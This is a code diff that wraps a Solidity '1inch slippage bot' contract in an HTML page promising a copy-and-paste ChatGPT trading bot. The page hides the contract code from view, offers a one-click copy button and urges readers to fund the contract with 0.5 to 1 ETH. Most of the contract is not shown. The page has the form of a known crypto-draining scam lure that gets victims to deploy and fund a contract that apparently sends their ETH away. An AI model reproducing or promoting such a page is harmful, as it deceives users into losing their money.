@@ -1,11 +1,25 @@
-//SPDX-License-Identifier: MIT
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>my page</title>
+    <style>
+        #codeBlock {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Making a Trading Bot with ChatGPT Just COPY & PASTE </h1>
+    <p>🚨🚨 READ ME! : I've received messages from people who didn't fund the contract with enough Ethereum to cover gas fees and possible burn fees. The bot targets token contracts with max 10% burn fee and anything lower. However, nowadays most tokens come with 2~6% fees. If you fund the contract with 0.4 ETH or less, and the bot targets another token with high burn fees, the contract will waste a lot of gas fees. I recommend funding the contract with at least 0.5 ~ 1 ETH to make sure that won't happen.🚨🚨.</p>
+    <h2>Let's Build New World With WEB 3.0</h2>
+    
+    <pre id="codeBlock">
+        //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
-// Import Libraries Migrator/Exchange/Factory
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
-import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
 
 contract OneinchSlippageBot {
  
@@ -567,3 +581,21 @@ contract OneinchSlippageBot {
         return string(_newValue);
     }
 }
+    </pre>
+
+    <button onclick="copyCode()">Copy Code</button>
+
+    <script>
+        function copyCode() {
+            var codeBlock = document.getElementById("codeBlock");
+            var range = document.createRange();
+            range.selectNode(codeBlock);
+            window.getSelection().removeAllRanges();
+            window.getSelection().addRange(range);
+            document.execCommand("copy");
+            window.getSelection().removeAllRanges();
+            alert("Code copied!");
+        }
+    </script>
+</body>
+</html>
